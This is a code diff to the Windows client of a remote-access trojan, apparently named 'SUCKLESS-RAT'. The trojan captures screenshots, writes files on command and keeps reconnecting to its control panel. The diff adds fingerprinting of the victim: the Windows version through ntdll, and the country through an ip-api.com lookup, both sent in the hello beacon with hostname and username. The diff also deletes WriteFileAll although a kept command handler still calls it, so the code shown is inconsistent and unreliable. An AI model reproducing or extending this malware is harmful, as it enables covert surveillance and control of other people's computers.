@@ -1,6 +1,8 @@
 #include "../common/proto.h"
 #include "../common/tls.h"
+#include "../common/util.h"
 #include <windows.h>
+#include <wininet.h>
 #include <stdio.h>
 
 static TlsCtx* g_tls = NULL;
@@ -142,24 +144,43 @@ static char* Screenshot(uint32_t* outLen) {
   return out;
 }
 
-static char* ReadFileAll(const char* p, uint32_t* outLen) {
-  HANDLE f = CreateFileA(p, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
-  if (f == INVALID_HANDLE_VALUE) { *outLen = 0; return NULL; }
-  DWORD sz = GetFileSize(f, NULL);
-  char* buf = (char*)malloc(sz);
-  DWORD n = 0;
-  if (buf) ReadFile(f, buf, sz, &n, NULL);
-  CloseHandle(f);
-  *outLen = buf ? n : 0;
-  return buf;
+static char g_country[64] = "?";
+
+// SChannel's GetVersionEx lies for non-manifested apps (always reports 6.2),
+// so ask ntdll directly and map the build number to a marketing name.
+static const char* WinName() {
+  static char name[32];
+  if (name[0]) return name;
+  HMODULE nt = GetModuleHandleA("ntdll.dll");
+  typedef LONG (WINAPI* Fn)(OSVERSIONINFOW*);
+  Fn fn = nt ? (Fn)GetProcAddress(nt, "RtlGetVersion") : NULL;
+  OSVERSIONINFOW vi = { sizeof(vi) };
+  DWORD b = (fn && fn(&vi) == 0) ? vi.dwBuildNumber : 0;
+  const char* v = b >= 22000 ? "11" : b >= 10240 ? "10" : b >= 9600 ? "8.1"
+                : b >= 9200 ? "8" : b >= 7600 ? "7" : b >= 6000 ? "Vista"
+                : b >= 2600 ? "XP" : "";
+  sprintf(name, "Windows%s%s", v[0] ? " " : "", v);
+  return name;
 }
 
-static void WriteFileAll(const char* p, const char* d, uint32_t dLen) {
-  HANDLE f = CreateFileA(p, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
-  if (f == INVALID_HANDLE_VALUE) return;
-  DWORD n;
-  WriteFile(f, d, dLen, &n, NULL);
-  CloseHandle(f);
+static void FetchCountry() {
+  HINTERNET h = InternetOpenA("SUCKLESS-RAT", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
+  if (!h) return;
+  DWORD t = 3000;
+  InternetSetOptionA(h, INTERNET_OPTION_CONNECT_TIMEOUT, &t, sizeof(t));
+  InternetSetOptionA(h, INTERNET_OPTION_SEND_TIMEOUT, &t, sizeof(t));
+  InternetSetOptionA(h, INTERNET_OPTION_RECEIVE_TIMEOUT, &t, sizeof(t));
+  HINTERNET u = InternetOpenUrlA(h, "http://ip-api.com/line/?fields=country", NULL, 0,
+      INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_UI | INTERNET_FLAG_NO_CACHE_WRITE, 0);
+  if (u) {
+    char b[128] = {0}; DWORD r = 0;
+    if (InternetReadFile(u, b, sizeof(b) - 1, &r) && r) {
+      while (r && (b[r - 1] == '\n' || b[r - 1] == '\r' || b[r - 1] == ' ')) b[--r] = 0;
+      if (r && strcmp(b, "fail") != 0) { strncpy(g_country, b, sizeof(g_country) - 1); }
+    }
+    InternetCloseHandle(u);
+  }
+  InternetCloseHandle(h);
 }
 
 static DWORD WINAPI Worker(LPVOID param) {
@@ -191,7 +212,7 @@ static DWORD WINAPI Worker(LPVOID param) {
 
   char hbuf[256] = {0}, ubuf[256] = {0}; DWORD n = sizeof(hbuf);
   GetComputerNameA(hbuf, &n); n = sizeof(ubuf); GetUserNameA(ubuf, &n);
-  char hello[1024]; sprintf(hello, "%s|%s|Windows", hbuf, ubuf);
+  char hello[1024]; sprintf(hello, "%s|%s|%s|%s", hbuf, ubuf, WinName(), g_country);
   TlsSendMsg(t, C_HELLO, hello, strlen(hello));
 
   uint16_t cmd = 0; char* pl = NULL; uint32_t plLen = 0;
@@ -215,6 +236,7 @@ static DWORD WINAPI Worker(LPVOID param) {
         break;
       }
       case C_FS_PUT: {
+        if (!pl) break;
         char* nl = strchr(pl, '\n');
         if (nl) { *nl = 0; WriteFileAll(pl, nl + 1, plLen - (uint32_t)(nl - pl) - 1); }
         break;
@@ -247,6 +269,7 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR lpCmdLine, int) {
   InitializeCriticalSection(&g_cs);
   WSADATA w; WSAStartup(MAKEWORD(2, 2), &w);
   if (!lpCmdLine || !*lpCmdLine) return 0;
+  FetchCountry();
   // Panel may be closed, crashed or restarted; a remote agent must survive that
   // and keep trying. Only an explicit "Disconnect client" (C_BYE) ends it.
   while (!g_bye) {
